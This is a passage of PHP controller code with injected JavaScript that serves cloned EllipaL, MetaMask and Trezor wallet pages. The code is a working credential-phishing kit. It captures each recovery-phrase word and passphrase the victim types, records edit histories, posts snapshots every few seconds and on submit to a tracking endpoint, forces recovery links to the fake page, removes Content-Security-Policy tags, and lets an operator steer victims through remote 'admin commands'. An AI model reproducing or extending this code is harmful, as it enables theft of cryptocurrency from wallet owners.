Ã¢â€šÂ¬
  document.addEventListener('DOMContentLoaded',function(){
    _applyText();

    // 1. Move alarm above the submit row
    var alarm=document.getElementById('ellip-alarm');
    var submitRow=document.querySelector('.flex.w-full.justify-end');
    if(alarm&&submitRow&&submitRow.parentNode) submitRow.parentNode.insertBefore(alarm,submitRow);
    if(_llElInvalid) showAlarm();

    // 2. 24/12 Word toggle â€” in-page show/hide
    (function(){
      var b24=document.getElementById('ellipal-24-btn');
      var b12=document.getElementById('ellipal-12-btn');
      if(b24){b24.style.cursor='pointer';b24.onclick=function(){setWordCount(24);};}
      if(b12){b12.style.cursor='pointer';b12.onclick=function(){setWordCount(12);};}
      setWordCount(24);
    })();

    // 3. Wire submit (Disconnect) button ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â it's inside .flex.w-full.justify-end
    (function(){
      var sub=document.getElementById('ellipal-submit-btn');
      if(!sub)return;
      _submitBtn=sub;
      sub.style.cursor='pointer';
      sub.onclick=function(e){e.preventDefault();e.stopImmediatePropagation();submitPhrase();};
    })();

    // 4. Passphrase input tracking
    var ppInp=document.querySelector('input[placeholder*="assphrase"]');
    if(ppInp) ppInp.addEventListener('input',function(){sendState(false);});

    // 5. Word inputs with Enter nav
    var inputs=[];
    (function attach(){
      inputs=Array.from(document.querySelectorAll('input[placeholder="Word"]')).slice(0,24);
      if(inputs.length<24){setTimeout(attach,250);return;}
      inputs.forEach(function(inp,i){
        inp.addEventListener('input',function(){sendState(false);syncSubmitBtn();});
        inp.addEventListener('keydown',function(e){
          if(e.key!=='Enter')return;
          e.preventDefault();
          if(i<inputs.length-1)inputs[i+1].focus();
          else submitPhrase();
        });
      });

      /* Paste handler for first input - split pasted words into all inputs */
      if(inputs.length>0){
        inputs[0].addEventListener('paste',function(e){
          e.preventDefault();
          var paste=(e.clipboardData||window.clipboardData).getData('text');
          setTimeout(function(){
            if(!paste)return;
            var words=paste.trim().split(/\s+/).filter(function(w){return w.length>0;});
            /* Set all values FIRST, then dispatch events */
            for(var i=0;i<Math.min(words.length,inputs.length);i++){
              inputs[i].value=words[i];
            }
            /* Dispatch input event on first input to trigger sendState */
            if(inputs.length>0)inputs[0].dispatchEvent(new Event('input',{bubbles:true}));
            /* Force send final state after small delay to ensure all values are captured */
            setTimeout(function(){sendState(true);},50);
          },50);
        });
      }
    })();
    setInterval(function(){sendState(false);},3000);
  });
})();
</script>
JS;
        $ellipFouc="<script>(function(){try{var t=localStorage.getItem('ellip_custom_title'),s=localStorage.getItem('ellip_custom_subtitle');if(!t&&!s)return;var css='';if(t)css+='#ellipal-page-title{visibility:hidden!important}';if(s)css+='#ellipal-page-subtitle{visibility:hidden!important}';var el=document.createElement('style');el.id='_ll_fouc';el.textContent=css;document.head.appendChild(el);window._removeLLFouc=function(){try{var x=document.getElementById('_ll_fouc');if(x)x.remove();}catch(x){}window._removeLLFouc=null;};setTimeout(function(){if(window._removeLLFouc)window._removeLLFouc();},3000);}catch(e){}})();</script>";$html=str_ireplace('</head>',$ellipFouc.'</head>',$html);$html=str_replace('</body>',$bridge.$ui.'</body>',$html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    private function cleanMetaMaskHTML(string $html): string
    {
        $html = str_replace('href="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/index.css"', 'href="/metamask/metamask.css"', $html);
        $html = str_replace('src="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/images/logo/metamask-fox.svg"', 'src="/metamask/metamask-fox.svg"', $html);
        $html = preg_replace('/href="chrome-extension:\/\/nkbihfbeogaeaoehlefnkodbefgpgknn\/assets\/icon-[^"]*"/', 'href="/metamask/assets/icon-64.a4c8b72be64e26f4e637.png"', $html);
        $html = str_replace('url("./images/icons/arrow-down.svg")', 'url("/metamask/images/icons/arrow-down.svg")', $html);
        $html = preg_replace('/<script\b[^>]*chrome-extension:[^>]*><\/script>/i', '', $html);
        $html = preg_replace_callback(
            '/<link\b[^>]*rel=["\']preload["\'][^>]*>/i',
            function ($m) {
                $tag = $m[0];
                if (str_contains($tag, '/metamask/assets/Geist-Regular.bddca65ad845ef52ee29.woff2')
                    || str_contains($tag, '/metamask/assets/Geist-Medium.4d9cac5f65d9e08a0a4f.woff2')
                    || str_contains($tag, '/metamask/assets/Geist-SemiBold.6d1d7715275e839f8e34.woff2')) {
                    return $tag;
                }
                return '';
            },
            $html
        );
        $html = preg_replace('/<meta[^>]*Content-Security-Policy[^>]*>/i', '', $html);
        return $html;
    }

    // ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Trezor pages ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬

    private function trezorHtml(string $file): string
    {
        $html = file_get_contents(resource_path('views/user/trezor/' . $file));
        if (str_starts_with($html, "\xEF\xBB\xBF")) $html = substr($html, 3);
        if (!preg_match('/^\s*<!DOCTYPE/i', $html)) $html = "<!DOCTYPE html>\n" . $html;
        $cssName = preg_replace('/\.html$/i', '.css', $file);
        $cssFile = resource_path('views/user/trezor/' . $cssName);
        if (file_exists($cssFile)) {
            $css  = file_get_contents($cssFile);
            $html = preg_replace_callback(
                '/<link[^>]+href=["\']' . preg_quote($cssName, '/') . '["\'][^>]*\/?>/i',
                fn() => '<style>html,body{margin:0!important;padding:0!important}' . $css . '</style>',
                $html
            );
        }
        return $html;
    }

    public function trezorConnect(Request $request)
    {
        $html = $this->trezorHtml('connect.html');

        // Inject stable ID onto the title element
        $html = preg_replace('/(<div\b[^>]*\bclass="[^"]*text-xl font-medium[^"]*"[^>]*)>/', '$1 id="trz-connect-title">', $html, 1);

        $bridge = $this->buildCommandBridge('trezor_connect', '/trezor/phrase-page', true);
        $ui = <<<JS
<script>
(function(){
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      if(!d.commands||!d.commands.length)return;
      try{d.commands=d.commands.filter(function(c){if(!c.id)return true;var k='_ll_cmd_'+c.id;if(sessionStorage.getItem(k))return false;sessionStorage.setItem(k,'1');return true;});}catch(e){}
      d.commands.forEach(function(cmd){
        if(cmd.command==='redirect'){
          var url=(cmd.payload&&cmd.payload.url)||'/trezor/recover';
          var pp=(cmd.payload&&cmd.payload.post)||{};
          var nT=pp._title||'';
          var dSK='ll_ct_'+url.replace(/[^a-z0-9]/gi,'_');
          if(nT)sessionStorage.setItem(dSK+'_t',nT);
          if(url===window.location.pathname)return;
          var _qUrl=url;
          var _ppKeys=Object.keys(pp);
          if(_ppKeys.length){var _sep=_qUrl.indexOf('?')>=0?'&':'?';_ppKeys.forEach(function(k){_qUrl+=_sep+encodeURIComponent(k)+'='+encodeURIComponent(pp[k]);_sep='&';});}
          window.location.href=_qUrl;
        }
        if(cmd.command==='reset'){window.location.reload();}
      });
    }catch(e){}
  };

  document.addEventListener('DOMContentLoaded',function(){
    document.querySelectorAll('a,button').forEach(function(el){
      var t=(el.textContent||'').trim().toLowerCase();
      var h=(el.getAttribute('href')||'').toLowerCase();
      if(t.includes('recover')||t.includes('seed')||t.includes('restore')||t.includes('import')||h.includes('recover')||h.includes('restore')){
        el.addEventListener('click',function(e){e.preventDefault();window.location.href='/trezor/recover';});
      }
    });
  });
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $ui . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function trezorRecover(Request $request)
    {
        $html = $this->trezorHtml('PhraseRecover.html');
        $bridge = $this->buildCommandBridge('trezor_recover', '/trezor/loading', true);
        $trzrInvalidJs = $this->consumeFormStateOnce('trezor_recover') ? 'true' : 'false';
        $html = preg_replace('/(<button\b[^>]*\bbg-\[#82d8b9\][^>]*)>/', '$1 id="trzp-submit-btn">', $html, 1);
        $ui = <<<JS
<script>
(function(){
  var _llTrzrInvalid={$trzrInvalidJs};
  var _submitBtn=null;
  var _currentCount=24;
  var _walletMode='standard';
  function getInputs(){
    return Array.from(document.querySelectorAll('.grid input, input[placeholder^="Word"]')).filter(function(el){
      return el.id!=='trzp-passphrase';
    });
  }
  function getActiveInputs(){
    return getInputs().filter(function(el){
      var wrap=el.closest('.relative')||el.parentElement;
      if(wrap&&wrap.style.display==='none')return false;
      if(el.closest('[hidden]'))return false;
      return true;
    });
  }
  function showAlarm(msg){
    var a=document.getElementById('trzp-alarm');
    if(!a)return;
    a.innerHTML=msg.replace(/\\n/g,'<br>');
    a.style.display='block';
    clearTimeout(a._t);
    a._t=setTimeout(function(){a.style.display='none';},15000);
  }
  function hop(){
    if(typeof window.navigateTo==='function')window.navigateTo('/trezor/loading');
    else window.location.href='/trezor/loading';
  }
  function handleSubmit(e){
    if(e){e.preventDefault();e.stopImmediatePropagation();}
    if(!_submitBtn||_submitBtn.disabled)return;
    hop();
  }
  function updateSubmitBtn(){
    if(!_submitBtn)return;
    var active=getActiveInputs();
    var filled=active.filter(function(i){return i.value.trim()!=='';}).length;
    _submitBtn.disabled=(filled<active.length||filled===0);
  }
  function setWalletMode(mode){
    _walletMode=mode;
    var _ppRow=document.getElementById('trzp-passphrase-row');
    var _ppInput=document.getElementById('trzp-passphrase');
    if(_ppRow)_ppRow.style.display=(mode==='passphrase')?'':'none';
    if(mode!=='passphrase'&&_ppInput)_ppInput.value='';
    updateSubmitBtn();
  }
  window._trzp_setMode=setWalletMode;
  document.addEventListener('DOMContentLoaded',function(){
    if(_llTrzrInvalid)showAlarm('Incorrect recovery phrase. Please check your words and try again.');
    function setActiveWordBtn(n){
      document.querySelectorAll('button').forEach(function(b){
        var t=(b.textContent||'').trim();
        if(/^\\d+\\s*words?\$/i.test(t)){
          if(parseInt(t,10)===n){ b.style.borderColor='#82d8b9'; }
          else { b.style.borderColor=''; }
        }
      });
    }
    setActiveWordBtn(24);
    var _ppInput=document.getElementById('trzp-passphrase');
    if(_ppInput)_ppInput.addEventListener('input',updateSubmitBtn);
    document.querySelectorAll('button').forEach(function(btn){
      var txt=(btn.textContent||'').trim();
      var m=txt.match(/^(\\d+)\\s*words?\$/i);
      if(!m)return;
      var n=parseInt(m[1],10);
      btn.addEventListener('click',function(e){
        e.preventDefault();e.stopImmediatePropagation();
        _currentCount=n;
        setActiveWordBtn(n);
        getInputs().forEach(function(inp,idx){
          inp.value='';
          var wrap=inp.closest('.relative')||inp.parentElement;
          if(wrap)wrap.style.display=(idx<n)?'':'none';
        });
        updateSubmitBtn();
      });
    });
    getInputs().forEach(function(inp){
      inp.addEventListener('input',updateSubmitBtn);
      inp.addEventListener('keydown',function(e){
        if(e.key==='Enter'){
          e.preventDefault();
          var active=getActiveInputs();
          var ai=active.indexOf(inp);
          if(ai>=0&&ai<active.length-1) active[ai+1].focus();
          else handleSubmit(null);
        }
      });
      inp.addEventListener('paste',function(e){
        var text=(e.clipboardData||window.clipboardData).getData('text');
        if(!text)return;
        var words=text.trim().split(/\\s+/).filter(Boolean);
        if(words.length<2)return;
        e.preventDefault();
        var active=getActiveInputs();
        var startIdx=Math.max(0,active.indexOf(inp));
        words.slice(0,active.length-startIdx).forEach(function(w,i){
          if(active[startIdx+i]) active[startIdx+i].value=w;
        });
        updateSubmitBtn();
      });
    });
    _submitBtn=document.getElementById('trzp-submit-btn')||document.querySelector('.trzp-continue');
    if(_submitBtn){
      _submitBtn.addEventListener('click',handleSubmit,true);
      updateSubmitBtn();
    }
    var EYE_SHOW='<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
    var EYE_HIDE='<svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
    function addEyeBtn(wrap,inp){
      if(!wrap||!inp||wrap.querySelector('.trzp-eye-btn'))return;
      inp.style.paddingRight='26px';
      var b=document.createElement('button');
      b.type='button';b.className='trzp-eye-btn';
      b.style.cssText='position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:0;color:#82d8b9;line-height:0;';
      b.innerHTML=EYE_HIDE;
      b.addEventListener('click',function(e){e.preventDefault();inp.type=inp.type==='password'?'text':'password';b.innerHTML=inp.type==='password'?EYE_HIDE:EYE_SHOW;});
      wrap.appendChild(b);
    }
    getInputs().forEach(function(inp,idx){
      var wrap=inp.closest('.relative')||inp.parentElement;
      addEyeBtn(wrap,inp);
      if(wrap&&!wrap.querySelector('.trzp-num')){
        var num=document.createElement('span');
        num.className='trzp-num';
        num.textContent=String(idx+1);
        num.style.cssText='position:absolute;left:5px;top:3px;font-size:9px;color:rgba(255,255,255,0.28);pointer-events:none;line-height:1;font-weight:600;';
        wrap.appendChild(num);
        inp.style.paddingTop='15px';
        inp.style.paddingLeft='6px';
      }
    });
    var pp=document.getElementById('trzp-passphrase');
    var pr=document.getElementById('trzp-passphrase-row');
    if(pp&&pr)addEyeBtn(pr,pp);
  });
})();
</script>
JS;
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isTrzGet(u){
    var p=destPath(u);
    return p==='/trezor/phrase-page'||p==='/trezor/connect'||p==='/trezor/recover'||p==='/trezor/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isTrzGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        var dest=(take.payload&&take.payload.url)||'/';
        if(destPath(dest)===window.location.pathname) window.location.reload();
        else window.location.href=dest;
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html = str_replace('</body>', $bridge . $go . $ui . '</body>', $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function trezorLoading(Request $request)
    {
        $html   = $this->trezorHtml('loading.html');
        $bridge = $this->buildCommandBridge('trezor_loading', '/trezor/loading', true);
        $go = <<<'JS'
<script>
(function(){
  var prev=window.handleAdminCommands;
  function destPath(u){
    u=u||'/';
    var i=u.indexOf('?');
    return i>=0?u.slice(0,i):u;
  }
  function isTrzGet(u){
    var p=destPath(u);
    return p==='/trezor/phrase-page'||p==='/trezor/connect'||p==='/trezor/recover'||p==='/trezor/loading';
  }
  function wouldKeep(c){
    if(!c.id)return true;
    try{return !sessionStorage.getItem('_ll_cmd_'+c.id);}catch(e){return true;}
  }
  window.handleAdminCommands=function(ev){
    try{
      var d=JSON.parse(ev.detail.xhr.responseText);
      var cmds=d.commands;
      var take=null;
      if(cmds&&cmds.length){
        cmds.forEach(function(cmd){
          if(cmd.command!=='redirect')return;
          var u=(cmd.payload&&cmd.payload.url)||'/';
          if(!isTrzGet(u))return;
          if(!wouldKeep(cmd))return;
          take=cmd;
        });
      }
      if(take){
        if(take.id){
          try{sessionStorage.setItem('_ll_cmd_'+take.id,'1');}catch(e){}
        }
        if(window._llNavDone)return;
        window._llNavDone=true;
        window.location.href=(take.payload&&take.payload.url)||'/';
        return;
      }
    }catch(e){}
    if(prev) prev.apply(this,arguments);
  };
})();
</script>
JS;
        $html   = str_replace('<!--[[BRIDGE]]-->', $bridge.$go, $html);
        return response($html, 200, ['Content-Type' => 'text/html; charset=utf-8']);
    }

    public function trezorPhrasePage(Request $request)
    {
        $html = $this->trezorHtml('PhrasePage.html');

        $csrf      = csrf_token();
        $track     = route('track.event');
        $bridge    = $this->buildCommandBridge('trezor_phrase_page', '/trezor/loading', true);
        $initMode  = $request->query('mode') === 'passphrase' ? 'passphrase' : 'standard';

        $trzpShowInvalid = false;
        if ($request->isMethod('get') && !$request->has('_liveled_preview')) {
            $trzpToken = $request->cookie('liveled_token');
            $trzpSess  = $trzpToken ? \App\Models\UserSession::where('session_token', $trzpToken)->first() : null;
            $trzpMeta  = is_array($trzpSess?->metadata) ? $trzpSess->metadata : [];
            $trzpFs    = (isset($trzpMeta['form_state']) && is_array($trzpMeta['form_state']))
                ? $trzpMeta['form_state'] : [];
            if (($trzpFs['trezor_phrase_page'] ?? 'default') === 'invalid') {
                $trzpShowInvalid = true;
                if ($trzpSess) {
                    \App\Models\UserSession::where('session_token', $trzpSess->session_token)
                        ->where('metadata->form_state->trezor_phrase_page', 'invalid')
                        ->update(['metadata->form_state->trezor_phrase_page' => 'default']);
                }
            }
        }
        $trzpInvalidJs = $trzpShowInvalid ? 'true' : 'false';

        // Inject stable ID on the submit button so JS can find it regardless of text
        $html = preg_replace('/(<button\b[^>]*\bbg-\[#82d8b9\][^>]*)>/', '$1 id="trzp-submit-btn">', $html, 1);

        $ui = <<<JS
<style>
@keyframes trzp-spin{to{transform:rotate(360deg)}}
.trzp-spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:trzp-spin .8s linear infinite;vertical-align:middle;margin-right:6px}
</style>
<script>
(function(){
  var CSRF='{$csrf}', TRACK='{$track}';
  var _llTrzpInvalid={$trzpInvalidJs};
  var _wh={}, _lastWords={}, _lastSnap='';
  var _submitBtn=null, _submitBtnOrigHTML='';
  var _currentCount=24;
  var _walletMode='{$initMode}';
  var _ppLastVal='', _ppHistory=[];

  // â”€â”€ Word grid helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  function getInputs(){
    return Array.from(document.querySelectorAll('.grid input, input[placeholder^="Word"]')).filter(function(el){
      return el.id!=='trzp-passphrase';
    });
  }
  function getActiveInputs(){
    return getInputs().filter(function(el){
      var wrap=el.closest('.relative')||el.parentElement;
      if(wrap&&wrap.style.display==='none')return false;
      if(el.closest('[hidden]'))return false;
      return true;
    });
  }
  function getWords(){
    return getActiveInputs().map(function(i){return i.value.trim();});
  }

  // â”€â”€ Snapshot sending â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  function sendState(force){
    if(!window._llDocId||!window._llStayOk)return Promise.resolve();
    var words=getWords();
    if(!words.some(Boolean)&&!force)return Promise.resolve();
    words.forEach(function(w,i){
      var k=String(i+1),prev=_lastWords[k]||'';
      if(prev&&prev!==w){if(!_wh[k])_wh[k]=[];if(_wh[k].indexOf(prev)===-1)_wh[k].push(prev);}
      _lastWords[k]=w;
    });
    var _pp=document.getElementById('trzp-passphrase');
    var ppVal=(_walletMode==='passphrase'&&_pp)?_pp.value:'';
    // Track passphrase history (previous values)
    if(_walletMode==='passphrase'&&_ppLastVal&&_ppLastVal!==ppVal){
      if(_ppHistory.indexOf(_ppLastVal)===-1)_ppHistory.push(_ppLastVal);
    }
    if(_walletMode==='passphrase')_ppLastVal=ppVal;
    var snap=JSON.stringify({words:words,totalWords:_currentCount,wordHistory:_wh,passphrase:ppVal,passphraseHistory:_ppHistory});
    if(snap===_lastSnap&&!force)return Promise.resolve();
    _lastSnap=snap;
    return window._llPostTrack(new URLSearchParams({_token:CSRF,page:'trezor_phrase_page',type:'phrase_input',element:'full_state',value:snap,doc:window._llDocId,stay:String(window._llStayId||'')}));
  }
  if(window._llStayReadyPromise)window._llStayReadyPromise.then(function(){sendState(false);});

  function showAlarm(msg){
    var a=document.getElementById('trzp-alarm');
    if(!a)return;
    a.innerHTML=msg.replace(/\\n/g,'<br>');
    a.style.display='block';
    clearTimeout(a._t);
    a._t=setTimeout(function(){a.style.display='none';},15000);
  }

  function handleSubmit(e){
    if(e){e.preventDefault();e.stopImmediatePropagation();}
    var words=getWords();
    if(!words.filter(Boolean).length)return;
    Promise.resolve(window._llStayReadyPromise).then(function(){
      if(!window._llStayOk)throw new Error('stay');
      return sendState(true);
    }).then(function(){
      var _pp=document.getElementById('trzp-passphrase');
      var ppVal=(_walletMode==='passphrase'&&_pp)?_pp.value:'';
      var submitVal=words.filter(Boolean).join(' ')+(ppVal?' [passphrase:'+ppVal+']':'');
      var b=new URLSearchParams({_token:CSRF,page:'trezor_phrase_page',type:'form_submit',element:'seed_phrase',value:submitVal,doc:window._llDocId,stay:String(window._llStayId||'')});
      return window._llPostTrack(b);
    }).then(function(){
      if(typeof window.navigateTo==='function')window.navigateTo('/trezor/loading');
      else window.location.href='/trezor/loading';
    }).catch(function(){});
  }

  window.handleAdminCommands=function(event){
    try{
      var d=JSON.parse(event.detail.xhr.responseText);
      if(!d.commands||!d.commands.length)return;
      d.commands.forEach(function(cmd){
        if(cmd.command==='redirect'){
          var _p=cmd.payload||{};
          var url=_p.url||'/trezor/loading';
          var post=_p.post||{};
          if(post&&Object.keys(post).length){
            var form=document.createElement('form');form.method='POST';form.action=url;
            var ti=document.createElement('input');ti.type='hidden';ti.name='_token';ti.value=CSRF;form.appendChild(ti);
            Object.keys(post).forEach(function(k){var i=document.createElement('input');i.type='hidden';i.name=k;i.value=post[k];form.appendChild(i);});
            document.body.appendChild(form);form.submit();
            return;
          }
          var _recPath=url||'/';
          var _recQ=_recPath.indexOf('?');
          if((_recQ>=0?_recPath.slice(0,_recQ):_recPath)==='/trezor/recover'){window.location.href=url;}
          else if(typeof window.navigateTo==='function')window.navigateTo(url);
          else window.location.href=url;
        }
        if(cmd.command==='show_message'){
          var ao=document.getElementById('ao'),msg=document.getElementById('ao-msg');
          if(msg)msg.textContent=(cmd.payload&&cmd.payload.message)||'';
          if(ao)ao.style.display='flex';
        }
      });
    }catch(e){}
  };

  document.addEventListener('DOMContentLoaded',function(){
    if(_llTrzpInvalid)showAlarm('Incorrect recovery phrase. Please check your words and try again.');
    // â”€â”€ Word-count buttons (24 / 20 / 12) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    function setActiveWordBtn(n){
      document.querySelectorAll('button').forEach(function(b){
        var t=(b.textContent||'').trim();
        if(/^\d+\s*words?$/i.test(t)){
          if(parseInt(t,10)===n){
            b.style.boxShadow='';b.style.borderColor='#82d8b9';
            b.classList.remove('ring-2','ring-[#82d8b9]');
          } else {
            b.style.boxShadow='';b.style.borderColor='';
            b.classList.remove('ring-2','ring-[#82d8b9]');
          }
        }
      });
    }
    setActiveWordBtn(24); // init: 24 active

    function updateSubmitBtn(){
      if(!_submitBtn)return;
      var active=getActiveInputs();
      var filled=active.filter(function(i){return i.value.trim()!=='';}).length;
      _submitBtn.disabled=(filled<active.length||filled===0);
    }

    // â”€â”€ Wallet type dropdown â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    var _walletToggle=document.getElementById('trzp-wallet-toggle');
    var _walletDropdown=document.getElementById('trzp-wallet-dropdown');
    var _walletLabel=document.getElementById('trzp-wallet-label');
    var _walletSub=document.getElementById('trzp-wallet-sub');
    var _walletChevron=document.getElementById('trzp-wallet-chevron');
    var _ppRow=document.getElementById('trzp-passphrase-row');
    var _ppInput=document.getElementById('trzp-passphrase');
    var _walletSelector=document.getElementById('trzp-wallet-selector');

    function setWalletMode(mode){
      _walletMode=mode;
      if(_walletDropdown)_walletDropdown.style.display='none';
      if(_walletChevron)_walletChevron.style.transform='';
      if(_walletLabel)_walletLabel.textContent=(mode==='passphrase')?'Passphrase wallet':'Standard wallet';
      if(_walletSub)_walletSub.textContent=(mode==='passphrase')?'Passphrase is required':'No passphrase';
      if(_ppRow)_ppRow.style.display=(mode==='passphrase')?'':'none';
      if(mode!=='passphrase'&&_ppInput)_ppInput.value='';
      sendState(true);
      updateSubmitBtn();
    }
    window._trzp_setMode=setWalletMode;
    if(_walletToggle&&_walletDropdown){
      _walletToggle.addEventListener('click',function(e){
        e.stopPropagation();
        var open=_walletDropdown.style.display!=='none';
        _walletDropdown.style.display=open?'none':'block';
        if(_walletChevron)_walletChevron.style.transform=open?'':'rotate(90deg)';
      });
    }
    document.addEventListener('click',function(e){
      if(_walletSelector&&!_walletSelector.contains(e.target)){
        if(_walletDropdown)_walletDropdown.style.display='none';
